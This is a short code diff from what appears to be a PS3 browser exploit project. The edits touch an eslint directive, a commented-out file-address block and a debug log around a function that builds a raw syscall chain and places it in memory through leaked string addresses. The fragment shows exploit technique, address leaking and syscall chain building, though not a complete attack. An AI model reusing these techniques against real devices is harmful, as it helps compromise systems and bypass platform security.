@@ -1,4 +1,4 @@
-/*eslint-disable no-unused-vars */
+/*eslint-disable no-unused-vars, no-param-reassign*/
 
 ///////////////////////////////////////
 
@@ -86,7 +86,7 @@ var searcher = null;
 
 var arrayLeaker = null;
 
-function init(step = 0, data = null) {
+function init(step = 0, data = null) {	
 	if (step === 0) {
 		logger.info("Initializing...");
 		step++;
@@ -124,19 +124,7 @@ function createChain() {
 	
 	addrChainStart = null;
 	
-	// TOOD: Be able to pass string and not have it be a wchar
-	/*var file = "/dev_usb000/zerosense";
-	arrayLeaker.setString(3, file);
-	var addrFile = arrayLeaker.getStringAddress(3);
-	if (addrFile === null) {
-		logger.error("Failed to get file address.");
-		return;
-	}
-	logger.info(`Found file at 0x${addrFile.toString(16)}`);*/
-	
 	var chain2 = new ChainBuilder().syscall(0x188, 0x1004, 0xA, 0x1B6, 0, 0, 0, 0, 0).create();
-	//var chain2 = new ChainBuilder().syscall(811, addrFile, 0o700, 0, 0, 0, 0, 0, 0).create();
-	logger.info(Util.str2hex(chain2));
 	arrayLeaker.setString(2, chain2);
 	var addrChain2 = arrayLeaker.getStringAddress(2);
 	if (addrChain2 === null) {
